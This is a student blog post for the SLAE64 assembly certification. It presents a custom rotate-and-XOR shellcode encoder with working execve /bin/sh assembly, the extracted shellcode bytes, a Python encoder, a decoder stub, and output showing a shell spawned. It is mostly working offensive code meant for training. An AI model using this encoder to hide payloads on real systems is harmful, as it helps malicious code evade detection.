
# SLAE Assignment #4

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online‐courses/securitytube-linux-assembly-expert/

Student ID: SLAE64 - 1525

## Assignment

* Create a custom encoding scheme like the "Insertion Encoder" we showed you 
* PoC with using execve-stack as the shellcode to encode with your schema and execute

## Theoretical description

Starting from 0xaa every next byte is rotated by 3 and xor encoded with the previous byte, creating a kind of encrypting chain

## Implementation

The implementation starts with shellcode extraction for the execve-stack

### Opcode extraction

The already written assembler code that execute a shell (execve-stack) is the following

```
; Filename: execve-nasm.nasm
; Author:  SLAE64 - 1525
;
; Purpose: execute /bin/sh
BITS 64

global _start

section .text

; settings
SH equ 0x68732f6e69622f2f

; syscall kernel opcodes
SYS_EXECVE equ 0x3b

_start:
    xor rax, rax
    push rax
    pop rdx         
    push rdx
    mov rbx, SH ; build //bin/sh
    push rbx ; copy ¨//bin/sh¨ string to stack
    mov rdi, rsp ; get the address for /bin/sh string
    push rax ; build args array, by pushing NULL
    push rdi ; then pushing string address
    mov rsi, rsp ; args array address
	push SYS_EXECVE
    pop rax
    syscall
```

let's extract the shellcode in the usual way with the aid of the following helper script:

```
#!/bin/bash

echo '######### NASM #########'

echo '[+] Assembling with Nasm ... '
nasm -f elf64 -o decoder.template.nasm.o decoder.template.nasm
echo '[+] Done!'

echo '[+] Linking ...'
ld -z execstack -o decoder.template.nasm.bin decoder.template.nasm.o
echo '[+] Done!'

rm -rf decoder.template.nasm.o

echo '[+] Objdump ...'
mycode=`objdump -d ./decoder.template.nasm.bin |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\x/g'|paste -d '' -s |sed 's/^/"/' | sed 's/$/"/g'`
echo $mycode
```

Let's execute it

```
$ ./compile-execve-stack.sh 
######### NASM #########
[+] Assembling with Nasm ... 
[+] Done!
[+] Linking ...
[+] Done!
[+] Objdump ...
"\x48\x31\xc0\x50\x5a\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05"
```

Hence the shellcode is the following:

```
\x48\x31\xc0\x50\x5a\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05
```

### Custom python encoder

Here follows the python encoder, it takes as input a shellcode and generate the corresponding encoded one to prepend before the decoding stub:

```python
#!/usr/bin/env python
# Python Custom Rotating - Xor Encoder
# Author: SLAE64 - 1525

shellcode = '\x48\x31\xc0\x50\x5a\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05'
rotation = 3

encoded = ""
encoded2 = ""

print('Encoded shellcode ...')

# Initialized with 0xaa
previous_byte = 0xaa

for x in bytearray(shellcode):
    # rotate left with 3
    new_byte = 0
    new_byte = x << rotation
    y = (new_byte & 0xff) + (new_byte >> 8)
    # xor with the previous byte
    z = y ^ previous_byte
    previous_byte = x
    encoded += '\\x'
    encoded += '%02x' % z

    encoded2 += '0x'
    encoded2 += '%02x,' % z

print(encoded)
print(encoded2)
print('Len: ', len(bytearray(shellcode)))
```

## Decoder stub

here follows the assembler code of the decoder stub

```

; Filename: Decoder.nasm
; Author:  SLAE64 - 1525
;
; Purpose: decode bytecode with progressive xor

BITS 64

global _start

section .data ; read/write

EncodedShellcode db 0xe8,0xc1,0x37,0x42,0x82,0xc8,0x10,0x95,0xc2,0x56,0x3c,0x29,0x1a,0x17,0xb4,0x30,0xf2,0x11,0x04,0xb6,0x65,0xea,0x15,0x04,0xbe,0xb5,0xb3,0xf9,0x20,0x27
EncodedShellcodeLenght equ $-EncodedShellcode

section .text ; readonly

InitialXORValue equ 0xaa

_start:

decoder:
	lea rdi, [rel EncodedShellcode]

	push EncodedShellcodeLenght ; shellcode lenght
	pop rcx
	
    push InitialXORValue ; initial value of XOR operation
    pop rdx

decode:
	xor dl, byte [rdi]  ; xor with the current byte
	ror dl, 3           ; rotate right with 3
	mov [rdi], dl  ; save back the transformed byte
	inc rdi
	loop decode

	jmp EncodedShellcode ; jump to the original shellcode now decoded

```

## Proof of execution

Once executed the shellcode leads to the following

```
$ ./compile-decoder-template.sh 
######### NASM #########
[+] Assembling with Nasm ... 
[+] Done!
[+] Linking ...
[+] Done!
[+] Objdump ...
"\x48\x8d\x3d\x1d\x00\x20\x00\x6a\x1e\x59\x68\xaa\x00\x00\x00\x5a\x32\x17\xc0\xca\x03\x88\x17\x48\xff\xc7\xe2\xf4\xe9\x03\x00\x20\x00"
$ ./decoder.template.nasm.bin 
$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
$ 

```